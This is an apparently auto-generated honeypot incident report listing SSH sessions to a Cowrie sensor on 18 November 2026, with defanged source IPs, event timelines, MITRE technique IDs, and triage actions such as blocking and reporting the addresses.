### 🔴 HIGH · IR-c4dd7c041c03

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-11-18 05:34 |
| **Last Seen** | 2026-11-18 05:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 05:34:35` | `cowrie.session.connect` |
| `2026-11-18 05:34:35` | `cowrie.client.version` |
| `2026-11-18 05:34:35` | `cowrie.client.kex` |
| `2026-11-18 05:34:36` | `cowrie.login.success` |
| `2026-11-18 05:34:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ce0af20c217

| Field | Detail |
|---|---|
| **Source IP** | `98.174.45[.]120` |
| **First Seen** | 2026-11-18 05:38 |
| **Last Seen** | 2026-11-18 05:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 05:38:22` | `cowrie.session.connect` |
| `2026-11-18 05:38:23` | `cowrie.client.version` |
| `2026-11-18 05:38:23` | `cowrie.client.kex` |
| `2026-11-18 05:38:25` | `cowrie.login.success` |
| `2026-11-18 05:38:25` | `cowrie.direct-tcpip.request` |
| `2026-11-18 05:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.174.45[.]120` to AbuseIPDB if not already reported
- [ ] Block `98.174.45[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2ec776150bc

| Field | Detail |
|---|---|
| **Source IP** | `223.86.148[.]242` |
| **First Seen** | 2026-11-18 05:38 |
| **Last Seen** | 2026-11-18 05:38 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 05:38:31` | `cowrie.session.connect` |
| `2026-11-18 05:38:32` | `cowrie.client.version` |
| `2026-11-18 05:38:32` | `cowrie.client.kex` |
| `2026-11-18 05:38:34` | `cowrie.login.success` |
| `2026-11-18 05:38:36` | `cowrie.direct-tcpip.request` |
| `2026-11-18 05:38:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.86.148[.]242` to AbuseIPDB if not already reported
- [ ] Block `223.86.148[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0bd6098ec59

| Field | Detail |
|---|---|
| **Source IP** | `183.109.153[.]176` |
| **First Seen** | 2026-11-18 05:39 |
| **Last Seen** | 2026-11-18 05:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 05:39:25` | `cowrie.session.connect` |
| `2026-11-18 05:39:26` | `cowrie.client.version` |
| `2026-11-18 05:39:26` | `cowrie.client.kex` |
| `2026-11-18 05:39:28` | `cowrie.login.success` |
| `2026-11-18 05:39:29` | `cowrie.direct-tcpip.request` |
| `2026-11-18 05:39:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.109.153[.]176` to AbuseIPDB if not already reported
- [ ] Block `183.109.153[.]176` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3d885ca06ae

| Field | Detail |
|---|---|
| **Source IP** | `103.26.53[.]164` |
| **First Seen** | 2026-11-18 05:39 |
| **Last Seen** | 2026-11-18 05:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 05:39:35` | `cowrie.session.connect` |
| `2026-11-18 05:39:35` | `cowrie.client.version` |
| `2026-11-18 05:39:35` | `cowrie.client.kex` |
| `2026-11-18 05:39:38` | `cowrie.login.success` |
| `2026-11-18 05:39:38` | `cowrie.direct-tcpip.request` |
| `2026-11-18 05:39:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.26.53[.]164` to AbuseIPDB if not already reported
- [ ] Block `103.26.53[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f958bc9e5c34

| Field | Detail |
|---|---|
| **Source IP** | `62.183.82[.]70` |
| **First Seen** | 2026-11-18 05:39 |
| **Last Seen** | 2026-11-18 05:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 05:39:37` | `cowrie.session.connect` |
| `2026-11-18 05:39:37` | `cowrie.client.version` |
| `2026-11-18 05:39:37` | `cowrie.client.kex` |
| `2026-11-18 05:39:39` | `cowrie.login.success` |
| `2026-11-18 05:39:40` | `cowrie.direct-tcpip.request` |
| `2026-11-18 05:39:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.183.82[.]70` to AbuseIPDB if not already reported
- [ ] Block `62.183.82[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf8e9bdd3ca8

| Field | Detail |
|---|---|
| **Source IP** | `88.255.189[.]44` |
| **First Seen** | 2026-11-18 05:39 |
| **Last Seen** | 2026-11-18 05:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 05:39:45` | `cowrie.session.connect` |
| `2026-11-18 05:39:45` | `cowrie.client.version` |
| `2026-11-18 05:39:45` | `cowrie.client.kex` |
| `2026-11-18 05:39:47` | `cowrie.login.success` |
| `2026-11-18 05:39:47` | `cowrie.direct-tcpip.request` |
| `2026-11-18 05:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.255.189[.]44` to AbuseIPDB if not already reported
- [ ] Block `88.255.189[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00194b4b5b4a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-18 06:01 |
| **Last Seen** | 2026-11-18 06:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 06:01:47` | `cowrie.session.connect` |
| `2026-11-18 06:01:47` | `cowrie.client.version` |
| `2026-11-18 06:01:47` | `cowrie.client.kex` |
| `2026-11-18 06:01:47` | `cowrie.login.success` |
| `2026-11-18 06:01:47` | `cowrie.direct-tcpip.request` |
| `2026-11-18 06:01:47` | `cowrie.direct-tcpip.data` |
| `2026-11-18 06:01:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-216f584915a2

| Field | Detail |
|---|---|
| **Source IP** | `113.158.205[.]225` |
| **First Seen** | 2026-11-18 06:05 |
| **Last Seen** | 2026-11-18 06:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 06:05:46` | `cowrie.session.connect` |
| `2026-11-18 06:05:47` | `cowrie.client.version` |
| `2026-11-18 06:05:47` | `cowrie.client.kex` |
| `2026-11-18 06:05:50` | `cowrie.login.success` |
| `2026-11-18 06:05:50` | `cowrie.direct-tcpip.request` |
| `2026-11-18 06:05:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.158.205[.]225` to AbuseIPDB if not already reported
- [ ] Block `113.158.205[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afe19a64ff51

| Field | Detail |
|---|---|
| **Source IP** | `49.124.149[.]196` |
| **First Seen** | 2026-11-18 06:06 |
| **Last Seen** | 2026-11-18 06:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 06:06:00` | `cowrie.session.connect` |
| `2026-11-18 06:06:01` | `cowrie.client.version` |
| `2026-11-18 06:06:01` | `cowrie.client.kex` |
| `2026-11-18 06:06:04` | `cowrie.login.success` |
| `2026-11-18 06:06:04` | `cowrie.direct-tcpip.request` |
| `2026-11-18 06:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.149[.]196` to AbuseIPDB if not already reported
- [ ] Block `49.124.149[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cd599968b92

| Field | Detail |
|---|---|
| **Source IP** | `218.156.93[.]203` |
| **First Seen** | 2026-11-18 06:41 |
| **Last Seen** | 2026-11-18 06:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 06:41:53` | `cowrie.session.connect` |
| `2026-11-18 06:41:54` | `cowrie.client.version` |
| `2026-11-18 06:41:54` | `cowrie.client.kex` |
| `2026-11-18 06:41:57` | `cowrie.login.success` |
| `2026-11-18 06:41:58` | `cowrie.direct-tcpip.request` |
| `2026-11-18 06:42:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.156.93[.]203` to AbuseIPDB if not already reported
- [ ] Block `218.156.93[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (144) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-fb54422caf13 | HIGH | `14.54.22[.]11` | 2026-11-18 06:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-20f9a77c038f | HIGH | `70.175.182[.]42` | 2026-11-18 06:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6ef5acf97118 | HIGH | `98.26.13[.]10` | 2026-11-18 07:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2c07108b7b44 | HIGH | `211.226.103[.]20` | 2026-11-18 07:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b1a9d04b4d1c | HIGH | `62.122.195[.]14` | 2026-11-18 07:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8cc98778e330 | HIGH | `119.204.122[.]94` | 2026-11-18 07:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-672e573f1a62 | HIGH | `89.121.255[.]194` | 2026-11-18 07:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3c5173879123 | HIGH | `193.32.162[.]15` | 2026-11-18 07:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1d560ca538f5 | HIGH | `49.115.217[.]143` | 2026-11-18 07:44 | Y | 1 | 0 | `T1078 · T1592` |
| IR-93161a5de409 | HIGH | `129.121.102[.]54` | 2026-11-18 07:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2b09d3679fb2 | HIGH | `129.121.102[.]54` | 2026-11-18 07:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ed1a2a9cf478 | HIGH | `4.157.250[.]195` | 2026-11-18 07:57 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ea510bb3cc88 | HIGH | `4.157.250[.]195` | 2026-11-18 07:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e8abae93389a | HIGH | `154.14.144[.]90` | 2026-11-18 08:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-14db2c228d7d | HIGH | `83.209.248[.]110` | 2026-11-18 08:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6eae8beb60f6 | HIGH | `195.3.220[.]7` | 2026-11-18 08:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-6077ce0624ff | HIGH | `49.124.153[.]21` | 2026-11-18 08:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ffd8f44a3c3d | HIGH | `27.24.141[.]169` | 2026-11-18 08:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d0ad6062333b | HIGH | `2.54.99[.]50` | 2026-11-18 08:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-63a2759a3e45 | HIGH | `174.68.47[.]176` | 2026-11-18 08:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e038c8f4358e | HIGH | `50.6.192[.]84` | 2026-11-18 08:11 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a813190ef0e0 | HIGH | `50.6.192[.]84` | 2026-11-18 08:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-92674f9764a9 | HIGH | `4.224.40[.]94` | 2026-11-18 08:11 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2f9391e851f6 | HIGH | `4.224.40[.]94` | 2026-11-18 08:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3dcab500a6cf | HIGH | `195.158.24[.]43` | 2026-11-18 08:11 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fd0e99e238ae | HIGH | `195.158.24[.]43` | 2026-11-18 08:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-09b1b50eea0b | HIGH | `160.119.66[.]206` | 2026-11-18 08:13 | Y | 6 | 3 | `T1059.004 · T1078 · T1105` |
| IR-a7c196473369 | HIGH | `160.119.66[.]206` | 2026-11-18 08:13 | Y | 1 | 3 | `T1059.004 · T1078 · T1105` |
| IR-cb8b464bc021 | HIGH | `176.53.159[.]196` | 2026-11-18 08:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1fa0d18e4c55 | HIGH | `47.254.215[.]62` | 2026-11-18 08:17 | Y | 2 | 0 | `T1078 · T1105` |
| IR-8d157b4e5590 | HIGH | `118.121.202[.]149` | 2026-11-18 08:18 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-b854b11b3f7b | HIGH | `58.209.82[.]184` | 2026-11-18 08:23 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-edbf31757d0a | HIGH | `58.209.82[.]184` | 2026-11-18 08:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-46f81891a6b5 | HIGH | `189.56.195[.]78` | 2026-11-18 08:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-59438f1e3ed3 | HIGH | `178.128.21[.]57` | 2026-11-18 08:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b33bd9494976 | HIGH | `154.125.228[.]145` | 2026-11-18 08:27 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3c2fca118cbe | HIGH | `154.125.228[.]145` | 2026-11-18 08:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1d23b7431995 | HIGH | `89.134.194[.]84` | 2026-11-18 08:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d12a5a5f93b2 | HIGH | `89.134.194[.]84` | 2026-11-18 08:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-989f08d6ed8b | HIGH | `14.225.206[.]187` | 2026-11-18 08:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-53dc0aa19354 | HIGH | `14.225.206[.]187` | 2026-11-18 08:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-65011b424974 | HIGH | `78.128.112[.]74` | 2026-11-18 08:40 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c4a787a70e3d | HIGH | `101.13.6[.]91` | 2026-11-18 08:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0d3fe95575c5 | HIGH | `14.39.124[.]140` | 2026-11-18 08:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7cb84b05db51 | HIGH | `103.108.67[.]180` | 2026-11-18 09:38 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-eee690b9dbbc | HIGH | `103.108.67[.]180` | 2026-11-18 09:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-853c07e194fc | HIGH | `77.239.124[.]145` | 2026-11-18 09:39 | Y | 1 | 0 | `T1078 · T1592` |
| IR-0e260bdf91d0 | HIGH | `202.165.28[.]182` | 2026-11-18 09:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f4ad47ded133 | HIGH | `202.165.28[.]182` | 2026-11-18 09:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-26ac3f552e63 | HIGH | `77.90.185[.]29` | 2026-11-18 09:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bffecf48f44a | HIGH | `80.94.95[.]118` | 2026-11-18 09:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d618a7c43990 | HIGH | `138.226.239[.]234` | 2026-11-18 09:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1cb0bbe97300 | HIGH | `138.226.239[.]233` | 2026-11-18 09:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ba9a5b1997ca | HIGH | `77.239.124[.]145` | 2026-11-18 10:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-d5c5d224bc58 | HIGH | `184.168.21[.]211` | 2026-11-18 10:21 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7508e732770d | HIGH | `184.168.21[.]211` | 2026-11-18 10:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-21930d1e7733 | HIGH | `195.178.191[.]5` | 2026-11-18 10:22 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c29ff2653ddc | HIGH | `195.178.191[.]5` | 2026-11-18 10:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-024d4a048b44 | HIGH | `187.16.96[.]250` | 2026-11-18 10:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bf8235e26db6 | HIGH | `187.16.96[.]250` | 2026-11-18 10:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4aca8dae8c2b | HIGH | `118.196.27[.]115` | 2026-11-18 10:44 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-117e8e9b7888 | HIGH | `118.196.27[.]115` | 2026-11-18 10:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b21a1d02e346 | HIGH | `176.53.159[.]196` | 2026-11-18 10:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-aadce3fac644 | HIGH | `154.92.17[.]128` | 2026-11-18 10:51 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-920e65d987e7 | HIGH | `154.92.17[.]128` | 2026-11-18 10:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-48d84b35fc66 | HIGH | `129.121.117[.]162` | 2026-11-18 10:52 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e9a74e4ed460 | HIGH | `129.121.117[.]162` | 2026-11-18 10:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ea5f2e1ca2af | HIGH | `45.173.193[.]140` | 2026-11-18 10:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2a552d1f1de4 | HIGH | `45.173.193[.]140` | 2026-11-18 10:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-75ee45623909 | HIGH | `143.105.152[.]184` | 2026-11-18 11:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cb0862a8ae36 | HIGH | `143.105.152[.]184` | 2026-11-18 11:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-579f5271d68c | HIGH | `43.99.105[.]5` | 2026-11-18 11:40 | Y | 1 | 0 | `T1078 · T1592` |
| IR-d7156ec71542 | HIGH | `200.46.212[.]206` | 2026-11-18 11:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-72236f2fff80 | HIGH | `200.46.212[.]206` | 2026-11-18 11:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3ae2d7eb309b | HIGH | `80.94.95[.]118` | 2026-11-18 11:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-320cf58becc9 | HIGH | `77.90.185[.]29` | 2026-11-18 11:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-47d31cb744ca | HIGH | `77.90.185[.]29` | 2026-11-18 12:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7aa04bb1bf2e | HIGH | `138.226.239[.]233` | 2026-11-18 12:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-449e99722a3e | HIGH | `96.78.175[.]36` | 2026-11-18 12:13 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-269cbb235935 | HIGH | `96.78.175[.]36` | 2026-11-18 12:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-efad3d33352f | HIGH | `199.165.159[.]137` | 2026-11-18 12:33 | Y | 3 | 0 | `T1078` |
| IR-83879de378ac | HIGH | `34.40.145[.]110` | 2026-11-18 13:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3833357449fc | HIGH | `34.40.145[.]110` | 2026-11-18 13:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4c69c8dedc0f | HIGH | `83.194.35[.]192` | 2026-11-18 13:06 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1c7a64e517eb | HIGH | `83.194.35[.]192` | 2026-11-18 13:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b6bc23d6e8c6 | HIGH | `80.94.92[.]55` | 2026-11-18 13:06 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e8fe75578c59 | HIGH | `78.128.112[.]74` | 2026-11-18 13:12 | Y | 1 | 0 | `T1078 · T1592` |
| IR-a5120ff47334 | HIGH | `80.94.92[.]55` | 2026-11-18 13:14 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-12cbfb19bcc4 | HIGH | `80.94.92[.]55` | 2026-11-18 13:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3b61e3d07c96 | HIGH | `176.53.159[.]196` | 2026-11-18 13:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5ee4e4078dd7 | HIGH | `77.90.185[.]29` | 2026-11-18 14:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cf5cc7b665f6 | HIGH | `80.94.95[.]118` | 2026-11-18 14:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dd94b68cae17 | HIGH | `138.226.239[.]233` | 2026-11-18 14:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-190ae47f380f | HIGH | `193.32.162[.]15` | 2026-11-18 14:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-18b214fedba8 | HIGH | `51.12.208[.]98` | 2026-11-18 14:44 | Y | 1 | 0 | `T1078 · T1592` |
| IR-dce3636d4beb | HIGH | `176.53.159[.]196` | 2026-11-18 15:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f62bd7c868c2 | HIGH | `189.194.140[.]170` | 2026-11-18 15:17 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4c369f9dc56c | HIGH | `189.194.140[.]170` | 2026-11-18 15:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7789ced81aef | HIGH | `167.99.98[.]129` | 2026-11-18 15:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1fd33aecb058 | HIGH | `167.99.98[.]129` | 2026-11-18 15:34 | Y | 0 | 0 | `T1078 · T1592` |
_… 44 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.19.117[.]129` | **5** | 2026-11-18 05:24 | 2026-11-18 12:20 | 0m | 10 | `T1110.001 · T1592` | 🟢 LOW |
| `139.19.117[.]129` | **3** | 2026-11-18 15:20 | 2026-11-18 18:19 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `119.207.23[.]90` | **2** | 2026-11-18 10:10 | 2026-11-18 12:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-18 17:01 | 2026-11-18 18:51 | 1m | 0 | `T1592` | 🟢 LOW |
| `193.187.110[.]160` | **2** | 2026-11-18 13:53 | 2026-11-18 14:14 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `77.239.124[.]132` | **2** | 2026-11-18 16:59 | 2026-11-18 18:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]145` | **2** | 2026-11-18 09:38 | 2026-11-18 10:27 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]171` | 1 | 2026-11-18 18:12 | 2026-11-18 18:12 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.86.158[.]26` | 1 | 2026-11-18 09:41 | 2026-11-18 09:41 | 11s | 0 | `T1592` | 🟢 LOW |
| `110.39.181[.]194` | 1 | 2026-11-18 05:46 | 2026-11-18 05:46 | 2s | 0 | `T1592` | 🟢 LOW |
| `111.33.71[.]238` | 1 | 2026-11-18 15:56 | 2026-11-18 15:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `111.33.71[.]238` | 1 | 2026-11-18 18:46 | 2026-11-18 18:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `118.40.157[.]149` | 1 | 2026-11-18 05:45 | 2026-11-18 05:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.211.134[.]177` | 1 | 2026-11-18 11:01 | 2026-11-18 11:01 | 2s | 0 | `T1592` | 🟢 LOW |
| `121.142.204[.]4` | 1 | 2026-11-18 06:23 | 2026-11-18 06:23 | 15s | 0 | `T1592` | 🟢 LOW |
| `121.156.234[.]165` | 1 | 2026-11-18 18:44 | 2026-11-18 18:44 | 12s | 0 | `T1592` | 🟢 LOW |
| `123.194.36[.]53` | 1 | 2026-11-18 06:43 | 2026-11-18 06:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `132.255.78[.]239` | 1 | 2026-11-18 08:08 | 2026-11-18 08:08 | 13s | 0 | `T1592` | 🟢 LOW |
| `137.175.150[.]72` | 1 | 2026-11-18 13:11 | 2026-11-18 13:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-18 05:29 | 2026-11-18 05:30 | 65s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-18 09:28 | 2026-11-18 09:29 | 74s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-18 12:45 | 2026-11-18 12:46 | 62s | 0 | `T1592` | 🟢 LOW |
